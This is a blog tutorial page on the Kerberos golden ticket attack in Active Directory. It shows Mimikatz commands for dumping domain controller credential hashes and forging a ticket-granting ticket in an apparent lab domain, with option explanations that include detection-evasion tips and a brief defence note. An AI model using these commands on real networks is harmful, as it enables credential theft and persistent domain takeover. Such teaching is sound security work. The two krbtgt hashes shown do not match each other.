@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>How to Golden Ticket Attack Active directory</title>
+
+  <link rel="icon" type="image/png" href="/assets/images/logo.png?v=96ad5fd1fb">
+  <link rel="apple-touch-icon" href="/assets/images/logo.png?v=96ad5fd1fb">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css?v=96ad5fd1fb">
+
+  <meta name="description" content="Golden ticket attack for domain persistence in an active directory network golden ticket is a forged Ticket granting ticket using the KRB TGT">
+    <link rel="canonical" href="https://sheerazali.com/blog/golden-ticket-attack/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Sheeraz Ali">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="How to Golden Ticket Attack Active directory">
+    <meta property="og:description" content="Golden ticket attack for domain persistence in an active directory network golden ticket is a forged Ticket granting ticket using the KRB TGT">
+    <meta property="og:url" content="https://sheerazali.com/blog/golden-ticket-attack/">
+    <meta property="og:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/05/2.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1">
+    <meta property="article:published_time" content="2021-05-18T08:35:19.000Z">
+    <meta property="article:modified_time" content="2021-05-18T08:41:10.000Z">
+    <meta property="article:tag" content="Active Directory">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ghost">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="How to Golden Ticket Attack Active directory">
+    <meta name="twitter:description" content="Golden ticket attack for domain persistence in an active directory network golden ticket is a forged Ticket granting ticket using the KRB TGT">
+    <meta name="twitter:url" content="https://sheerazali.com/blog/golden-ticket-attack/">
+    <meta name="twitter:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/05/2.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="sheeraz ali">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="Active Directory">
+    <meta name="twitter:site" content="@beingsheerazali">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="675">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Sheeraz Ali",
+        "url": "https://sheerazali.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://sheerazali.com/favicon.ico"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "sheeraz ali",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.gravatar.com/avatar/b78e4b3b7f8de6d5dafee8306d76ace7?s=250&r=x&d=mp",
+            "width": 250,
+            "height": 250
+        },
+        "url": "https://sheerazali.com/author/sheeraz/",
+        "sameAs": []
+    },
+    "headline": "How to Golden Ticket Attack Active directory",
+    "url": "https://sheerazali.com/blog/golden-ticket-attack/",
+    "datePublished": "2021-05-18T08:35:19.000Z",
+    "dateModified": "2021-05-18T08:41:10.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/05/2.png?fit=1920%2C1080&ssl=1",
+        "width": 1200,
+        "height": 675
+    },
+    "keywords": "Active Directory",
+    "description": "Golden ticket attack for domain persistence in an active directory network golden ticket is a forged Ticket granting ticket using the KRB TGT",
+    "mainEntityOfPage": "https://sheerazali.com/blog/golden-ticket-attack/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.130">
+    <link rel="alternate" type="application/rss+xml" title="Sheeraz Ali" href="https://sheerazali.com/rss/">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.51/umd/portal.min.js" data-i18n="true" data-ghost="https://sheerazali.com/" data-key="15f06e61ecb8d951198e7015b6" data-api="https://sheerazali.com/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="15f06e61ecb8d951198e7015b6" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://sheerazali.com/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://sheerazali.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=96ad5fd1fb"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=96ad5fd1fb">
+    <script defer src="/public/member-attribution.min.js?v=96ad5fd1fb"></script><style>:root {--ghost-accent-color: #FF1A75;}</style>
+</head>
+<body class="post-template tag-active-directory tag-hash-import-2026-01-05-15-55">
+
+<div class="terminal-wrapper">
+
+  <header class="site-header">
+  <div class="container">
+    <div class="header-content">
+
+      <a href="https://sheerazali.com/" class="site-logo">
+        <img src="/assets/images/logo.png" alt="Sheeraz Ali">
+      </a>
+
+      <nav class="main-nav">
+        <ul>
+          <li><a href="https://sheerazali.com/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>home<span class="bracket">]</span></a></li>
+          <li><a href="/blog/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>blog<span class="bracket">]</span></a></li>
+          <li><a href="/timeline/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>timeline<span class="bracket">]</span></a></li>
+          <li><a href="/resume/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>resume<span class="bracket">]</span></a></li>
+          <li><a href="https://www.codevigilant.com/author/syed_sheeraz_ali/" target="_blank" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>cves<span class="bracket">]</span></a></li>
+          <li><a href="https://sheerazali.com/#contact" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>contact<span class="bracket">]</span></a></li>
+        </ul>
+      </nav>
+
+      <div class="header-status">
+        <span class="status-indicator">
+          <span class="status-dot"></span>
+          <span class="status-text">Online</span>
+        </span>
+      </div>
+
+    </div>
+  </div>
+</header>
+
+  <main class="main-content">
+    
+<article class="single-post">
+  <div class="container">
+
+    <header class="post-header">
+      <div class="post-meta-top">
+        <a href="https://sheerazali.com/tag/active-directory/" class="post-category">Active Directory</a>
+        <span class="post-date">May 18, 2021</span>
+        <span class="reading-time">4 min read</span>
+      </div>
+
+      <h1 class="post-title glitch" data-text="How to Golden Ticket Attack Active directory">How to Golden Ticket Attack Active directory</h1>
+
+      <div class="post-author">
+        <span class="author-label">Author:</span>
+        <a href="https://sheerazali.com/author/sheeraz/">sheeraz ali</a>
+      </div>
+    </header>
+
+    <div class="featured-image">
+      <img src="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/05/2.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1" alt="How to Golden Ticket Attack Active directory">
+    </div>
+
+    <div class="post-body">
+      <div class="content-wrapper">
+        <div class="terminal-window">
+          <div class="terminal-header">
+            <span class="terminal-dot red"></span>
+            <span class="terminal-dot yellow"></span>
+            <span class="terminal-dot green"></span>
+            <span class="terminal-title">How to Golden Ticket Attack Active directory</span>
+          </div>
+          <div class="terminal-content">
+            <p>So Golden ticket attack is one of the ways to gain domain persistence once you have gained domain admin. To understand this attack please make sure you have a good understanding of <a href="https://sheerazali.com/how-to-kerberos-its-components-and-function/">Kerberos</a> and its process. You can read my detailed explanation <a href="https://sheerazali.com/how-to-kerberos-its-components-and-function/">here</a>. If you have recalled how Kerberos works let’s see where this attack fits in the cycle.</p><p>On step 3 of the process when the client sends a TGT to the ticket granting server that is where we can send a forged TGT and get a valid Service ticket from the KDC.</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_05_image.png" class="kg-image" alt="kerberos authentication golden ticket attack" loading="lazy" width="770" height="430"></figure><p>Golden ticket attack refers to forging a Fake Ticket Granting Ticket and sending it to the KDC. The ticket-granting ticket is encrypted with the hash of the KRBTGT account. This is the secret key that can help us make a valid TGT. Hence we can gain persistence on the system by forging as many TGT’s as we want for any user or service account.</p><h2 id="golden-ticket-attack-in-action">Golden ticket attack in action</h2><p>First, we need to have domain admin privileges on the system. I have already opened an elevated shell on a system with domain admin privileges. soon I will cover other privilege escalation techniques soon but for now, we have a domain admin session on a remote computer.</p><p>I had a session on <code>dcorp-dc.dollarcorp.moneycorp.loca</code>l and I loaded mimikatz in that session. At last, I entered the ps-session and dumped all the hashes from the dc.</p><pre><code class="language-powershell">PS C:\AD\Tools&gt; $sess = New-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+PS C:\AD\Tools&gt; Invoke-Command -Session $sess -FilePath .\Invoke-Mimikatz.ps1
+PS C:\AD\Tools&gt; Enter-PSSession -Session $sess
+[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents&gt; Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+ .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+  ## / \ ##  /*** Benjamin DELPY gentilkiwi ( benjamin@gentilkiwi.com )
+  ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+   '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/
+ mimikatz(powershell) # lsadump::lsa /patch
+ Domain : dcorp / S-1-5-21-1874506631-3219952063-538504511
+ RID  : 000001f4 (500)
+ User : Administrator
+ LM   :
+ NTLM : af0686cc0ca8f04df42210c9ac980760</code></pre><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_05_image-37.png" class="kg-image" alt loading="lazy" width="770" height="441"></figure><p>We will find the KRBTGT hash from the dump which is the 3rd one from the top. Next step is to forge a malicious TGT.</p><hr><h2 id="generating-a-golden-ticket">Generating a Golden ticket</h2><pre><code class="language-powershell">Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local 
+/sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:bc7c774ae1c2f9325adee16ff86681fc id:500 /groups:512 
+/startoffset:0 /endin:600 /renewmax:10080 /ptt"' </code></pre><p>The command to generate a golden ticket with mimikatz is given above lets take a deeper look at all its options.</p><p><strong>Invoke-mimikatz</strong> – this is the powershell function we get after loading <a href="//github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-mimikatz.ps1</a> in the session and -Command is to specify a command.</p><p><strong>kerberos::golden </strong>– is the module name in mimikatz to generate golden tickets.</p><p><strong>/User:Administrator</strong> – /User is to specify a user name and id in the TGT.</p><p><strong>/domain:dollarcorp.moneycorp.local</strong> – is to specify the FQDN or the domain name.</p><p><strong>/sid:S-1-5-21-1874506631-3219952063-538504511</strong> – is to specify  the domain sid.</p><p><strong>/krbtgt:ff46a9d8bd66c6efd77603da26796f35</strong> – is to specify the krbtgt hash we can use<strong> /aes128 </strong>and <strong>/aes256 </strong>to specify symmetric keys.</p><p><strong>id:500 /groups:512</strong> – these are to specify user id and group but this is optional</p><p><strong>/startoffset:0</strong> – this is optional parameter but 0 minutes means the ticket will be available right now. We can use negative to specify time in the past and a higher number to specify something in the future.</p><p><strong>/endin:600 </strong>– this option will specify the lifetime of the ticket mimikatz by default sets it to 10 years which can be easily detected so use 600 minutes which is AD Default.</p><p><strong>/renewmax:10080</strong> – ticket renewal time by default in mimikatz is again 10 years but we will set it to 10080 which is 7 days and its AD Default.</p><p><strong>/ptt</strong> – this option stands for pass the ticket it will load the ticket in memory. if we want to extract ticket on disk we can use <strong>/ticket</strong> option instead.</p><p>Now if we run the command above we get a golden ticket that is created and stored in our current session. If we run klist we can see we have the ticket.</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_05_image-39.png" class="kg-image" alt loading="lazy" width="770" height="427"></figure><h2 id="proof-of-concept">Proof of concept</h2><p>Now if we run ls on the dc’s c$ share we can successfully read files because we had the administrators TGT we could get the TGS for the CIFS that is the file system on the dc.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_image-40.png" class="kg-image" alt loading="lazy" width="770" height="243"><figcaption>proof of admin</figcaption></figure><p>If we list our kerberos tickets now we see there are 3 tickets available now 3rd one being the cifs service ticket.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_image-42.png" class="kg-image" alt loading="lazy" width="770" height="413"><figcaption>Got the service ticket for the CIFS service.</figcaption></figure><h2 id="defending-against-golden-ticket-attack">Defending against golden ticket attack</h2><p>To defend against this attack make sure to change your krbtgt account password twice. If you do it once that will not work since the hash is matched with both the current password and the password history. Another thing to note is to have at least 8-12 hours difference withing the two password changes.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="post-tags">
+      <span class="tags-label">Tags:</span>
+      <a href="/tag/active-directory/" class="tag">Active Directory</a>
+    </div>
+
+  </div>
+</article>
+
+  <section class="related-posts">
+    <div class="container">
+      <h3 class="section-title"><span class="prefix">./</span>related_writeups</h3>
+      <div class="related-grid">
+        <a href="/blog/raining-cves-on-wordpress-plugins-using-semgrep-slide-deck/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Raining CVE&#x27;s on wordpress plugins using Semgrep Slide Deck</h4>
+          <span class="date">Sep 10, 2022</span>
+        </a>
+        <a href="/blog/shibboleth-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Shibboleth Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 10, 2022</span>
+        </a>
+        <a href="/blog/horizontall-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Horizontall Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 05, 2022</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  </main>
+
+  <footer class="site-footer">
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-brand">
+        <span class="terminal-prefix">&gt;</span>
+        <span class="brand-text">sheeraz_ali</span>
+        <span class="cursor">_</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://www.linkedin.com/in/sheeraz-ali-979943177/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a>
+        <a href="https://www.youtube.com/@sheerazali" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
+        <a href="https://twitter.com/BeingSheerazAli" target="_blank" title="Twitter/X"><i class="fab fa-twitter"></i></a>
+        <a href="https://github.com/pwnmeow" target="_blank" title="GitHub"><i class="fab fa-github"></i></a>
+      </div>
+      <div class="footer-copy">
+        <span class="cmd-prompt">$</span>
+        <span class="cmd-text">echo</span>
+        <span class="cmd-string">"&copy; 2026 Sheeraz Ali. All rights reserved."</span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</div>
+
+<script src="/assets/js/main.js?v=96ad5fd1fb"></script>
+
+
+</body>
+</html>
